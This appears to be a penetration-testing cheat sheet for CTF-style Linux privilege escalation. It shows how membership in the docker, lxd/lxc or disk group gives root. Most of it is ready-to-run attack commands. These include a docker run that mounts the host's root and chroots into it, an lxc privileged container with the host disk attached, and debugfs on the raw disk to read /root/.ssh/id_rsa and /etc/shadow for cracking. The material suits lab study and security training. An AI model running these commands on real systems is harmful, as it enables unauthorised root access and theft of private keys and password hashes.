Membership in the `docker`, `lxd`, or `disk` group is root-equivalent — each lets you read or run as root without an exploit. Check `id` first.
## Goal
Spot a powerful group in `id` and abuse it (mount host /, debugfs the disk) for root.
## Tips
`id` is free and instant — run it first thing. docker/lxd/disk membership = game over, no exploit needed.

Checklist:
- [ ] `id` shows docker / lxd / lxc / disk / adm group?
- [ ] (docker) can you run `docker`?
- [ ] (lxd) is lxd installed? alpine image available?
- [ ] (disk) is /dev/sda* readable?
# Commands

### Step 1: check groups
```bash
id ; groups
```

## Exploit
### Case 1: docker group
**Enumerate:**
```bash
id    # ...,docker
```
**Exploit:**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh   # mount host / -> root
# inside: you're root on the host filesystem
```

### Case 2: lxd / lxc group
**Enumerate:**
```bash
id    # ...,lxd
```
**Exploit:**
```bash
lxc image import alpine.tar.gz --alias a               # transfer a tiny image first
lxc init a c -c security.privileged=true
lxc config device add c host disk source=/ path=/mnt/root recursive=true
lxc start c ; lxc exec c /bin/sh
cat /mnt/root/root/root.txt                            # -> host root fs
# seen on: HTB Tabby (LXD)
```

### Case 3: disk group
**Enumerate:**
```bash
id ; ls -l /dev/sda*    # ...,disk
```
**Exploit:**
```bash
debugfs /dev/sda1        # then: cat /root/.ssh/id_rsa  (read ANY file)
# or read /etc/shadow -> crack root
```

## Helpline:
1. Why these groups = root
```
docker -> container mounting host / -> chroot = root on host.
lxd/lxc -> privileged container with host / mounted = root.
disk -> raw read/write of the disk device -> read shadow/keys, write anything.
```

2. docker escape one-liner
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# no alpine? use any image you can pull, or the smallest local one (docker images).
```

3. lxd image (no internet)
```
build/transfer a tiny alpine image (lxd-alpine-builder),
lxc image import -> init security.privileged=true -> add host disk -> exec.
```

4. disk group debugfs
```
debugfs /dev/sda1   -> interactive fs read; cat any file (shadow, id_rsa).
no exploit, just direct disk access.
```
